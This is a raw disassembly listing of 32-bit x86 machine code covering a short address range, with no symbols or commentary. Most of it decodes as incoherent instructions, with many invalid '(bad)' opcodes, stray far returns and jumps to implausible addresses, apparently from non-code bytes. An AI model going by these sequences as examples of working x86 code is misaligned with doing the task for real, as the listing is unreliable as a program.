  43025d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430263:	test   BYTE PTR [ebx],dh
  430265:	out    0x5,al
  430267:	shl    BYTE PTR [edx+0x45],0x0
  43026b:	jmp    0x43022e
  43026d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430274:	inc    esi
  430275:	jle    0x430277
  430277:	test   edi,eax
  430279:	(bad)  
  43027a:	call   0x130037e
  43027f:	out    0x75,al
  430281:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430287:	in     al,dx
  430288:	mov    esp,edx
  43028a:	mov    ah,0x85
  43028c:	add    bh,bh
  43028e:	call   0x1292c92
  430293:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43029a:	add    ebx,esp
  43029c:	add    ah,ch
  43029e:	xor    BYTE PTR [ebp-0xff0073],al
  4302a4:	mov    ebx,ebp
  4302a6:	cld    
  4302a7:	jle    0x430232
  4302a9:	add    DWORD PTR gs:[eax],eax
  4302ac:	add    BYTE PTR [eax+0x1],dl
  4302af:	inc    ebp
  4302b0:	inc    ebp
  4302b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4302b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4302bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4302c3:	inc    ebp
  4302c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4302ca:	inc    ebp
  4302cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4302d1:	mov    edi,edi
  4302d3:	mov    eax,0xe80800ff
  4302d8:	inc    ebp
  4302d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4302df:	add    al,0x1
  4302e1:	rol    BYTE PTR [eax],0x1e
  4302e4:	jne    0x43032b
  4302e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4302ec:	inc    DWORD PTR [ecx]
  4302ee:	call   0x882bf3
  4302f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4302f9:	call   0x432cff
  4302fe:	xor    bh,bh
  430300:	push   edi
  430301:	adc    BYTE PTR [ebx-0x74741bbb],al
  430307:	fsub   st,st(4)
  430309:	ret    
  43030a:	loopne 0x4302a7
  43030c:	xor    DWORD PTR [edx],0x31
  43030f:	cmp    edi,edi
  430311:	bswap  eax
  430313:	rol    BYTE PTR gs:[eax],0x5
  430317:	jmp    0x12e0461
  43031c:	mov    eax,DWORD PTR [ebp-0x4]
  43031f:	add    BYTE PTR [eax+0xff0100],bh
  430325:	cld    
  430326:	jne    0x4303a5
  430328:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43032e:	jb     0x430331
  430330:	add    BYTE PTR [eax],al
  430332:	push   eax
  430333:	fild   DWORD PTR [ebp+0x0]
  430336:	mov    edx,DWORD PTR [eax-0x68]
  430339:	inc    ebp
  43033a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430340:	or     bh,bh
  430342:	inc    ebp
  430343:	call   0x1272a47
  430348:	jge    0x430397
  43034a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430350:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430356:	fwait
  430357:	mov    eax,0x30132
  43035c:	lea    esi,[ebp+0x2c]
  43035f:	xor    edi,edi
  430361:	(bad)  
  430362:	call   0x1422ccf
  430367:	call   0x1372cf7
  43036c:	jne    0x4302f9
  43036e:	xor    edi,esp
  430370:	add    eax,DWORD PTR [eax+0xc018d]
  430376:	push   DWORD PTR [eax]
  430378:	call   0xcc2cd4
  43037d:	enter  0x45ff,0xe0
  430381:	mov    ecx,DWORD PTR [ebp-0x28]
  430384:	xor    eax,DWORD PTR [eax]
  430386:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43038c:	(bad)  
  43038d:	xchg   ebp,eax
  43038e:	call   0x1420492
  430393:	mov    cl,0x45
  430395:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43039b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4303a2:	mov    edi,edi
  4303a4:	or     BYTE PTR [eax],cl
  4303a6:	inc    ebp
  4303a7:	test   DWORD PTR gs:[eax],eax
  4303aa:	je     0x4303f1
  4303ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4303b2:	xor    edx,DWORD PTR [eax-0x73]
  4303b5:	push   ebp
  4303b6:	or     BYTE PTR [ebp+0x21007572],al
  4303bc:	inc    ebp
  4303bd:	loopne 0x43034a
  4303bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4303c6:	int    0x0
  4303c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4303ce:	inc    ebp
  4303cf:	push   ebp
  4303d0:	cmp    ebp,eax
  4303d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4303d9:	cld    
  4303da:	fadd   QWORD PTR [eax+0x3b014d]
  4303e0:	jne    0x430412
  4303e2:	push   0xf8898557
  4303e7:	loopne 0x43045e
  4303e9:	inc    ebp
  4303ea:	lea    eax,[ebx+0x72e8e4cc]
  4303f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4303f6:	jmp    0x43042b
  4303f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4303fe:	xor    eax,edi
  430400:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43040a:	rcl    BYTE PTR [eax-0x40],1
  43040d:	inc    ebp
  43040e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430416:	inc    ebp
  430417:	xchg   ebp,eax
  430418:	ud0    ebp,DWORD PTR [ebx]
  43041b:	inc    DWORD PTR [eax]
  43041d:	daa    
  43041e:	jbe    0x430420
  430420:	mov    dl,BYTE PTR [eax-0x80]
  430423:	push   ebp
  430424:	pop    ds
  430425:	mov    ecx,DWORD PTR [esp+esi*8]
  430428:	inc    eax
  430429:	retf   
  43042a:	inc    ebp
  43042b:	iret   
  43042c:	jb     0x4303f6
  43042e:	mov    eax,DWORD PTR [edi]
  430430:	int3   
  430431:	inc    ebp
  430432:	inc    ebp
  430433:	add    DWORD PTR [ecx],esi
  430435:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43043c:	xor    dh,BYTE PTR [ebx]
  43043e:	pushf  
  43043f:	lea    ecx,[ecx+0x4d72d808]
  430445:	add    BYTE PTR [ebx],dh
  430447:	inc    ebp
  430448:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43044e:	xor    dl,BYTE PTR [edx]
  430450:	add    eax,DWORD PTR [ebp-0x77]
  430453:	mov    eax,esp
  430455:	fmul   QWORD PTR [ebp-0x3d]
  430458:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43045f:	mov    DWORD PTR [ebp-0x24],eax
  430462:	rol    DWORD PTR [ebp-0x64],1
  430465:	xor    eax,edi
  430467:	mov    ecx,0xff858db0
  43046c:	clc    
  43046d:	enter  0x4d45,0x3c
  430471:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430478:	test   esi,edi
  43047a:	clc    
  43047b:	inc    DWORD PTR [ebp+0x45]
  43047e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430486:	test   DWORD PTR [ecx],esi
  430488:	clc    
  430489:	pushf  
  43048a:	inc    ebp
  43048b:	(bad)  
  43048c:	cmp    ah,bh
  43048e:	pushf  
  43048f:	inc    ebp
  430490:	mov    edx,DWORD PTR [eax-0x24]
  430493:	add    BYTE PTR [ebp+0x0],dl
  430496:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43049c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4304a0:	add    al,dl
  4304a2:	jmp    0x1040672
  4304a7:	jb     0x4304f6
  4304a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4304af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4304b2:	xor    ecx,DWORD PTR [edi]
  4304b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4304b8:	(bad)  
  4304ba:	clc    
  4304bb:	int3   
  4304bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4304c3:	push   cs
  4304c4:	xor    ecx,eax
  4304c6:	xor    esp,ecx
  4304c8:	add    ebp,DWORD PTR [eax]
  4304ca:	add    esi,DWORD PTR [eax]
  4304cc:	(bad)  
  4304ce:	retf   0x55cc
  4304d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4304d5:	(bad)  
  4304d6:	cli    
  4304d7:	fdiv   st(1),st
  4304d9:	test   DWORD PTR [eax+edi*8],ecx
  4304dc:	dec    ebp
  4304dd:	inc    ebp
  4304de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4304e4:	add    BYTE PTR [ebp+0x0],al
  4304e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4304ea:	mov    ecx,ebx
  4304ec:	clc    
  4304ed:	jne    0x4304ba
  4304ef:	mov    esi,0xd672d3
  4304f4:	into   
  4304f5:	into   
  4304f6:	scas   eax,DWORD PTR es:[edi]
  4304f7:	dec    ebp
  4304f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4304fe:	sub    ecx,esi
  430500:	cmp    ecx,DWORD PTR [ebp+0x77]
  430503:	(bad)  
  430504:	mov    edi,eax
  430506:	mov    al,0x85
  430508:	mov    eax,edi
  43050a:	add    BYTE PTR [ebp-0x75],al
  43050d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430514:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43051a:	(bad)  
  43051c:	retf   0x559c
  43051f:	(bad)  
  430520:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430527:	inc    ebp
  430528:	add    eax,0xeb9c4d3f
  43052d:	(bad)  
  43052e:	mov    ecx,eax
  430530:	lods   al,BYTE PTR ds:[esi]
  430531:	test   DWORD PTR [ebp-0x8],edx
  430534:	xor    ecx,DWORD PTR [ebp+0x33]
  430537:	mov    eax,DWORD PTR [ebx]
  430539:	lock add ecx,ebx
  43053c:	bswap  esi
  43053e:	retf   0x55d1
  430541:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430547:	jmp    0x430542
  430549:	add    BYTE PTR ds:0xebc44d8b,al
  43054f:	push   ebp
  430550:	mov    ebp,DWORD PTR [ebx]
  430552:	test   al,0x8b
  430554:	push   ebp
  430555:	clc    
  430556:	xor    ecx,ebx
  430558:	xor    ecx,esi
  43055a:	add    edx,ecx
  43055c:	add    eax,DWORD PTR [edx+0xca010f]
  430562:	push   ebp
  430563:	dec    ebp
  430564:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43056a:	stc    
  43056b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430571:	scas   eax,DWORD PTR es:[edi]
  430572:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430578:	xor    ebp,DWORD PTR [ebx]
  43057a:	xor    edi,DWORD PTR [ebx]
  43057c:	add    esi,DWORD PTR [edi+0x3]
  43057f:	mov    ecx,DWORD PTR [edi]
  430581:	clc    
  430582:	retf   0x55cb
  430585:	into   
  430586:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43058d:	mov    eax,0x3376554d
  430592:	mov    esi,DWORD PTR [ebx]
  430594:	enter  0x5503,0x3
  430598:	xor    ecx,DWORD PTR [edi]
  43059a:	xor    ecx,edx
  43059c:	add    edx,DWORD PTR [ebp+0x3]
  43059f:	mov    ecx,DWORD PTR [edi]
  4305a1:	lock retf 0x4dfa
  4305a5:	stc    
  4305a6:	mov    ecx,DWORD PTR [eax]
  4305a8:	or     BYTE PTR [ebp+0x4d],cl
  4305ab:	jmp    0x107063b
  4305b0:	dec    ebp
  4305b1:	dec    ebp
  4305b2:	(bad)  
  4305b3:	mov    esp,esp
  4305b5:	clc    
  4305b6:	test   ebx,ecx
  4305b8:	clc    
  4305b9:	ror    DWORD PTR [ebp-0x2a],cl
  4305bc:	mov    esi,ecx
  4305be:	in     al,dx
  4305bf:	scas   eax,DWORD PTR es:[edi]
  4305c0:	inc    ebp
  4305c1:	mov    esi,DWORD PTR [ebx]
  4305c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4305ca:	retf   
  4305cb:	ja     0x43059b
  4305cd:	mov    ebp,DWORD PTR [eax-0x48]
  4305d0:	dec    ebp
  4305d1:	xor    ecx,DWORD PTR [di+0x3]
  4305d5:	mov    ebp,eax
  4305d7:	clc    
  4305d8:	push   ebp
  4305d9:	retf   
  4305da:	mov    dl,bl
  4305dc:	adc    esi,edx
  4305de:	jb     0x4305ae
  4305e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4305e6:	in     al,dx
  4305e7:	jge    0x4305b4
  4305e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4305ec:	mov    esi,DWORD PTR [edi-0x24]
  4305ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4305f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4305fc:	mov    edx,ebx
  4305fe:	in     al,dx
  4305ff:	(bad)  
  430600:	ror    esi,cl
  430602:	push   ebp
  430603:	scas   eax,DWORD PTR es:[edi]
  430604:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43060a:	fwait
  43060b:	sub    esi,DWORD PTR [edx]
  43060d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430613:	lods   al,BYTE PTR ds:[esi]
  430614:	xor    esp,DWORD PTR [ebx]
  430616:	add    ecx,DWORD PTR [ebp-0x18]
  430619:	mov    edi,DWORD PTR [ebp-0x8]
  43061c:	mov    bl,cl
  43061e:	cmp    dl,bl
  430620:	jb     0x4305f0
  430622:	add    dh,dl
  430624:	dec    ebp
  430625:	scas   eax,DWORD PTR es:[edi]
  430626:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43062c:	shr    DWORD PTR [ebx],cl
  43062e:	into   
  43062f:	cmp    edx,esi
  430631:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430637:	dec    ebp
  430638:	dec    ebp
  430639:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43063f:	retf   
  430640:	xor    edx,esi
  430642:	add    ecx,esi
  430644:	imul   ecx,edx
  430647:	mov    DWORD PTR [ebp+0x8],edx
  43064a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43064d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430653:	add    esi,DWORD PTR [ebx]
  430655:	mov    ah,0x3
  430657:	inc    ebp
  430658:	rdtsc  
  43065a:	xlat   BYTE PTR ds:[ebx]
  43065b:	pushf  
  43065c:	jge    0x4305e7
  43065e:	xor    ebx,esp
  430660:	sub    eax,DWORD PTR [ebp-0x73]
  430663:	(bad)  
  430664:	cmp    al,al
  430666:	jb     0x4305ed
  430668:	add    al,bh
  43066a:	ror    DWORD PTR [ebp-0x7a],1
  43066d:	xor    edi,edi
  43066f:	add    edi,edi
  430671:	jmp    0x4306c0
  430673:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430679:	dec    ebp
  43067a:	into   
  43067b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430681:	fwait
  430682:	shl    DWORD PTR [edx],cl
  430684:	retf   0x5588
  430687:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43068d:	add    eax,DWORD PTR [eax]
  43068f:	call   0x8ace5be1
  430694:	fcom   DWORD PTR [ecx]
  430696:	retf   
  430697:	jb     0x4306fe
  430699:	add    ch,cl
  43069b:	dec    ebp
  43069c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4306a2:	dec    ebp
  4306a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4306a9:	jge    0x430679
  4306ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4306b1:	add    cl,dh
  4306b3:	dec    ebp
  4306b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4306ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4306be:	add    ah,bl
  4306c0:	jge    0x43064e
  4306c2:	push   0xffffff9b
  4306c4:	push   0x8b3032
  4306c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4306cd:	xor    edi,edi
  4306cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4306d2:	inc    ebp
  4306d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4306d9:	dec    ebp
  4306da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4306e0:	jbe    0x43066d
  4306e2:	mov    esp,eax
  4306e4:	ror    bl,1
  4306e6:	enter  0x14ce,0xaf
  4306ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4306f0:	push   ebp
  4306f1:	retf   0x5540
  4306f4:	push   ebp
  4306f5:	mov    esi,DWORD PTR [edx-0x18]
  4306f8:	mov    edx,ebx
  4306fa:	cld    
  4306fb:	(bad)  
  4306fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430703:	sti    
  430704:	add    dh,cl
  430706:	push   0xffffff94
  430708:	call   FWORD PTR [ebx+0x3b5032d0]
  43070e:	mov    ecx,DWORD PTR [edi]
  430710:	enter  0x455e,0xff
  430714:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43071a:	xor    esi,DWORD PTR [ebx]
  43071c:	mov    DWORD PTR [ebx],0xcace0f9c
  430722:	aas    
  430723:	push   ebp
  430724:	inc    ebp
  430725:	xor    edx,esi
  430727:	add    edx,esi
  430729:	mov    eax,DWORD PTR [ebx]
  43072b:	(bad)  
  43072c:	jmp    0x4306ba
  43072e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430734:	rol    ah,1
  430736:	mov    esi,0xf133104d
  43073b:	mov    edx,0xff388d80
  430740:	mov    dh,0xd1
  430742:	cmp    edx,DWORD PTR [ebp+0xf]
  430745:	mov    eax,DWORD PTR [edx-0x28]
  430748:	add    BYTE PTR [ebp-0x75],bh
  43074b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430752:	fwait
  430753:	retf   0x8632
  430756:	cmp    ebp,0x8
  430759:	call   ebx
  43075b:	inc    ebp
  43075c:	inc    ebp
  43075d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430763:	mov    esi,DWORD PTR [ecx]
  430765:	int3   
  430766:	pushf  
  430767:	add    al,0xc7
  430769:	add    al,al
  43076b:	add    bl,al
  43076d:	(bad)  
  43076e:	clc    
  43076f:	int3   
  430770:	inc    ebp
  430771:	add    BYTE PTR [ecx],dh
  430773:	push   eax
  430774:	pushf  
  430775:	mov    edi,eax
  430777:	enter  0xc008,0x85
  43077b:	aas    
  43077c:	clc    
  43077d:	gs inc ebp
  43077f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430785:	push   ss
  430786:	xor    ecx,DWORD PTR [ebp+0x3]
  430789:	sub    edx,DWORD PTR [ecx-0x76]
  43078c:	dec    ebp
  43078d:	add    DWORD PTR [ebx+0x88d845],ecx
  430793:	mov    esi,DWORD PTR [ebx]
  430795:	or     BYTE PTR [ebx],al
  430797:	cmp    edx,DWORD PTR [ecx-0x34]
  43079a:	dec    ebp
  43079b:	out    dx,eax
  43079c:	xor    eax,DWORD PTR [ebp+0x3]
  43079f:	mov    edx,DWORD PTR [ecx-0x28]
  4307a2:	dec    ebp
  4307a3:	add    BYTE PTR [ebx],dh
  4307a5:	push   0x518003
  4307aa:	push   eax
  4307ab:	add    BYTE PTR [ebx-0x300748b],cl
  4307b1:	sbb    BYTE PTR [ebp+0x45],cl
  4307b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4307ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4307c0:	dec    ebp
  4307c1:	inc    ebp
  4307c2:	xor    edx,esi
  4307c4:	add    edx,esi
  4307c6:	push   ecx
  4307c7:	(bad)  
  4307c8:	dec    ebp
  4307c9:	mov    al,ds:0xc5d83dff
  4307ce:	retf   
  4307cf:	(bad)  
  4307d0:	into   
  4307d1:	sub    bh,bh
  4307d3:	dec    esp
  4307d4:	adc    al,0x9c
  4307d6:	inc    ebp
  4307d7:	push   ebp
  4307d8:	test   DWORD PTR [edi],ecx
  4307da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4307e1:	jmp    0xc9bc16f5
  4307e6:	add    cl,dl
  4307e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4307f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4307f8:	rol    BYTE PTR [eax],0x54
  4307fb:	clc    
  4307fc:	gs jb  0x430806
  4307ff:	mov    eax,DWORD PTR [ebp-0x30]
  430802:	xor    al,0x40
  430804:	sub    al,0xc7
  430806:	mov    al,ah
  430808:	add    DWORD PTR [ebp+0x4534f845],eax
  43080e:	sub    al,0x80
  430810:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430817:	mov    ch,0xff
  430819:	clc    
  43081a:	add    DWORD PTR [ebp+0x60],0x3d
  43081e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430825:	inc    ebp
  430826:	dec    DWORD PTR [ebx-0x3427f701]
  43082c:	test   esi,ecx
  43082e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430834:	push   eax
  430835:	add    DWORD PTR [ebp+0x0],eax
  430838:	dec    ebx
  43083a:	or     al,0xce
  43083c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430843:	into   
  430844:	add    BYTE PTR [ebx-0x34ff2000],cl
  43084a:	mov    esi,ecx
  43084c:	sar    bh,0x45
  43084f:	adc    al,0x8b
  430851:	clc    
  430852:	fadd   DWORD PTR [ebp+0x0]
  430855:	mov    ebp,DWORD PTR [edx+0x8]
  430858:	push   edi
  430859:	adc    BYTE PTR [eax+0x1],0x83
  43085d:	add    al,al
  43085f:	retf   
  430860:	mov    ecx,esi
  430862:	cld    
  430863:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430869:	into   
  43086a:	add    BYTE PTR [ebx+0x756ae000],cl
  430870:	jne    0x4308a5
  430872:	inc    DWORD PTR [ebx]
  430874:	rcl    BYTE PTR [ecx+0x50],1
  430877:	push   eax
  430878:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43087e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430885:	sar    bh,0x84
  430888:	or     BYTE PTR [ebx],al
  43088a:	push   eax
  43088b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430891:	pushf  
  430892:	xor    edi,eax
  430894:	pushf  
  430895:	mov    ah,0x89
  430897:	test   esp,ebp
  430899:	clc    
  43089a:	inc    ebp
  43089b:	inc    ebp
  43089c:	mov    DWORD PTR [eax+eax*8],esi
  43089f:	sub    al,0x32
  4308a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4308a8:	dec    ebp
  4308a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4308b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4308be:	shl    DWORD PTR [ebp-0x380064],1
  4308c4:	enter  0x858d,0x60
  4308c8:	clc    
  4308c9:	inc    DWORD PTR [ebp+0x50]
  4308cc:	cmp    al,0x75
  4308ce:	pushf  
  4308cf:	(bad)  
  4308d0:	(bad)  
  4308d1:	pop    esp
  4308d2:	lods   al,BYTE PTR ds:[esi]
  4308d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4308d9:	mov    edi,DWORD PTR [esi]
  4308db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4308e2:	test   DWORD PTR [edi-0x8],edx
  4308e5:	sbb    al,0x45
  4308e7:	add    BYTE PTR [eax],bh
  4308e9:	push   0x8b809c
  4308ee:	loopne 0x430935
  4308f0:	push   ebp
  4308f1:	mov    esi,DWORD PTR [ebx]
  4308f3:	cld    
  4308f4:	add    eax,DWORD PTR [eax+0xf013b]
  4308fa:	adc    al,0x0
  4308fc:	add    bh,bh
  4308fe:	jmp    0xc00a1b
  430903:	add    BYTE PTR [ebp+0x45],cl
  430906:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43090c:	dec    ebp
  43090d:	push   0x38033
  430912:	cmp    eax,DWORD PTR [eax]
  430914:	unpcklps xmm7,xmm0
  430917:	jne    0x430919
  430919:	dec    DWORD PTR [ebx+0x5545c818]
  43091f:	mov    DWORD PTR [ebx],esi
  430921:	shl    BYTE PTR [ebx],1
  430923:	inc    ebp
  430924:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  43092a:	retf   0x5575
  43092d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430933:	(bad)  
  430934:	stc    
  430935:	loopne 0x430943
  430937:	test   DWORD PTR [ebp-0x8],ecx
  43093a:	xor    eax,DWORD PTR [ebp+0x3]
  43093d:	mov    ebp,ecx
  43093f:	rol    BYTE PTR [eax],1
  430941:	inc    ebp
  430942:	add    BYTE PTR [eax-0x7747ab3],bh
  430948:	clc    
  430949:	inc    ebp
  43094a:	retf   
  43094b:	mov    edx,ebx
  43094d:	loopne 0x430925
  43094f:	retf   
  430950:	into   
  430951:	into   
  430952:	scas   eax,DWORD PTR es:[edi]
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  43095a:	sub    ecx,esi
  43095c:	cmp    ecx,DWORD PTR [ebp+0x77]
  43095f:	(bad)  
  430960:	mov    edi,eax
  430962:	enter  0x8985,0xf8
  430966:	add    BYTE PTR [ebp-0x75],al
  430969:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430970:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430976:	(bad)  
  430978:	retf   0x559c
  43097b:	(bad)  
  43097c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430983:	inc    ebp
  430984:	add    eax,0xeb9c4d3f
  430989:	(bad)  
  43098a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430990:	xor    ecx,DWORD PTR [ebp+0x33]
  430993:	mov    eax,DWORD PTR [ebx]
  430995:	in     al,dx
  430996:	add    ecx,ebx
  430998:	bswap  esi
  43099a:	retf   0x55d1
  43099d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  4309a3:	jmp    0x43099e
  4309a5:	add    BYTE PTR ds:0xebf44d8b,al
  4309ab:	push   ebp
  4309ac:	mov    ebp,DWORD PTR [ebx]
  4309ae:	mov    eax,0x33f8558b
  4309b3:	retf   
  4309b4:	xor    ecx,esi
  4309b6:	add    edx,ecx
  4309b8:	add    eax,DWORD PTR [edx+0xca010f]
  4309be:	push   ebp
  4309bf:	dec    ebp
  4309c0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  4309c6:	stc    
  4309c7:	rol    DWORD PTR ds:0xebce4dd6,cl
  4309cd:	scas   eax,DWORD PTR es:[edi]
  4309ce:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  4309d4:	xor    ebp,DWORD PTR [ebx]
  4309d6:	xor    edi,DWORD PTR [ebx]
  4309d8:	add    esi,DWORD PTR [edi+0x3]
  4309db:	mov    ecx,DWORD PTR [edi]
  4309dd:	clc    
  4309de:	retf   0x55cb
  4309e1:	into   
  4309e2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  4309e9:	test   al,0x4d
  4309eb:	push   ebp
  4309ec:	jbe    0x430a21
  4309ee:	mov    esi,DWORD PTR [ebx]
  4309f0:	mov    al,0x3
  4309f2:	push   ebp
  4309f3:	add    esi,DWORD PTR [ebx]
  4309f5:	rdpmc  
  4309f7:	retf   0x5503
  4309fa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a00:	dec    ebp
  430a01:	stc    
  430a02:	mov    ecx,DWORD PTR [eax]
  430a04:	or     BYTE PTR [ebp+0x4d],cl
  430a07:	jmp    0x1370a97
  430a0c:	dec    ebp
  430a0d:	dec    ebp
  430a0e:	(bad)  
  430a0f:	mov    esp,esp
  430a11:	clc    
  430a12:	test   ebx,ecx
  430a14:	clc    
  430a15:	ror    DWORD PTR [ebp-0x2a],cl
  430a18:	mov    esi,ecx
  430a1a:	lock scas eax,DWORD PTR es:[edi]
  430a1c:	inc    ebp
  430a1d:	mov    esi,DWORD PTR [ebx]
  430a1f:	hlt    
  430a20:	pushf  
  430a21:	jge    0x4309ae
  430a23:	sub    esp,esp
  430a25:	cmp    ecx,ebx
  430a27:	ja     0x4309f7
  430a29:	mov    ebp,DWORD PTR [eax-0x58]
  430a2c:	dec    ebp
  430a2d:	xor    ecx,DWORD PTR [di+0x3]
  430a31:	mov    ebp,eax
  430a33:	clc    
  430a34:	push   ebp
  430a35:	retf   
  430a36:	mov    dl,bl
  430a38:	adc    esi,edx
  430a3a:	jb     0x430a0a
  430a3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430a42:	lock jge 0x430a10
  430a45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430a48:	mov    esi,DWORD PTR [edi-0x28]
  430a4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430a52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430a58:	mov    edx,ebx
  430a5a:	lock (bad) 
  430a5c:	ror    esi,cl
  430a5e:	push   ebp
  430a5f:	scas   eax,DWORD PTR es:[edi]
  430a60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430a66:	fwait
  430a67:	sub    esi,DWORD PTR [edx]
  430a69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a70:	xor    esp,DWORD PTR [ebx]
  430a72:	add    ecx,DWORD PTR [ebp-0x18]
  430a75:	mov    edi,DWORD PTR [ebp-0x8]
  430a78:	mov    bl,cl
  430a7a:	cmp    dl,bl
  430a7c:	jb     0x430a4c
  430a7e:	add    dh,dl
  430a80:	dec    ebp
